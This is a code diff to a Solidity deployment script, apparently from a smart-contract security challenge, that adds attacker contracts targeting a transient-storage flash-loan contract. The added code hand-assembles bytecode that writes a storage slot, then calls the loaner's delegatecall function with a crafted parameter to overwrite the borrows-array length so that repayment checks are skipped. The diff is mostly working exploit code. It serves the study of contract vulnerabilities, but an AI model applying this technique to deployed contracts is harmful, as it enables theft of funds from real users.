@@ -30,6 +30,7 @@ contract Deployer is Script {
         mockToken.mint(address(flashLoaner), type(uint256).max);
 
         // new AdversaryBorrower(flashLoaner, mockToken);
+        // new AdversaryStorageBorrower(flashLoaner, mockToken);
         // new HonestBorrower(flashLoaner, mockToken);
 
         vm.stopBroadcast();
@@ -66,6 +67,63 @@ contract AdversaryBorrower is IFlashLoanReceiver {
     }
 
     function submit() external {
+        mockToken.approve(address(flashLoaner), mockToken.balanceOf(address(this)));
+        flashLoaner.submit();
+    }
+
+    ////////////////////////////////////////////////////////////////
+    //                  IFlashLoanReceiver impl                   //
+    ////////////////////////////////////////////////////////////////
+
+    /// @notice `IFlashLoanReceiver` implementation
+    function bankroll() external {
+        // Borrow some of the mock token
+        (bool success,) = address(flashLoaner).call(
+            abi.encodePacked(bytes4(flashLoaner.borrow.selector), address(mockToken), uint256(10), address(this))
+        );
+
+        // Deploy contract to overwrite borrow length storage slot
+        // PUSH1 0
+        // PUSH1 block.timestamp
+        // TSTORE
+        bytes memory code =
+            bytes.concat(hex"60098060093d393df3600063", abi.encodePacked(uint32(block.timestamp)), hex"b400");
+        address _exploit;
+        assembly {
+            _exploit := create(0x00, add(code, 0x20), mload(code))
+        }
+
+        // Call the flash loaner contract's delegatecall logic with our exploit contract
+        // to overwrite the borrows array length slot and skip the debt collection loop.
+        // Should succeed.
+        bytes32 param;
+        assembly {
+            // Store this contract's address in memory @ 0x00
+            mstore(0x00, address())
+            // Assign our param's value
+            param := or(shl(0x60, _exploit), and(keccak256(0x00, 0x20), 0xFFFFFFFF))
+        }
+        (success,) = address(flashLoaner).call(abi.encodeWithSelector(flashLoaner.atlas.selector, param));
+    }
+}
+
+contract AdversaryStorageBorrower is IFlashLoanReceiver {
+    /// @notice The transient loan contract
+    ITransientLoan flashLoaner;
+    /// @notice The mock erc20 that will be borrowed
+    Token mockToken;
+
+    constructor(ITransientLoan _flashLoaner, Token _mockToken) {
+        flashLoaner = _flashLoaner;
+        mockToken = _mockToken;
+    }
+
+    /// @notice Initiate the exploit
+    function exploit() external {
+        flashLoaner.startLoan();
+    }
+
+    function submit() external {
         mockToken.approve(address(flashLoaner), 10);
         flashLoaner.submit();
     }
@@ -86,7 +144,7 @@ contract AdversaryBorrower is IFlashLoanReceiver {
         // PUSH1 block.timestamp
         // TSTORE
         bytes memory code =
-            bytes.concat(hex"60088060093d393df3600063", abi.encodePacked(uint32(block.timestamp)), hex"b4");
+            bytes.concat(hex"60098060093d393df3600063", abi.encodePacked(uint32(block.timestamp)), hex"5500");
         address _exploit;
         assembly {
             _exploit := create(0x00, add(code, 0x20), mload(code))
